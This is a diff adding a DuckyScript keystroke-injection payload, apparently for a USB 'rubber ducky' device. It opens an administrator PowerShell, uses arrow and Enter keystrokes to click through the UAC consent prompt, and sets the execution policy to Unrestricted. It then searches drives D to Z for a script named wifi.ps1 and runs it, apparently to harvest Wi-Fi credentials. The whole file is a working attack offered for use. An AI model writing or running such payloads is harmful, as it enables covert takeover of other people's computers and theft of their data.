@@ -1,0 +1,42 @@
+REM: by Clicks and Bits
+DEFAULT_DELAY 100
+GUI r
+DELAY 200
+STRING powershell Start-Process powershell -verb runas
+DELAY 500
+ENTER
+DELAY 5000
+LEFT
+ENTER
+DELAY 1000
+ENTER
+DELAY 500
+ENTER
+STRING SET-EXECUTIONPOLICY UNRESTRICTED
+ENTER
+DELAY 1000
+STRING Y
+DELAY 200
+ENTER
+
+STRING $pd = @('d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z')
+DELAY 200
+ENTER
+STRING foreach($p in $pd){
+DELAY 200
+ENTER
+STRING if(test-path -path $p":\wifi.ps1" -PathType Leaf){
+DELAY 200
+ENTER
+STRING powershell $p":\wifi.ps1"
+DELAY 200
+ENTER
+STRING stop-process -id $PID
+DELAY 200
+ENTER
+STRING break
+DELAY 200
+ENTER
+STRING }}
+DELAY 200
+ENTER
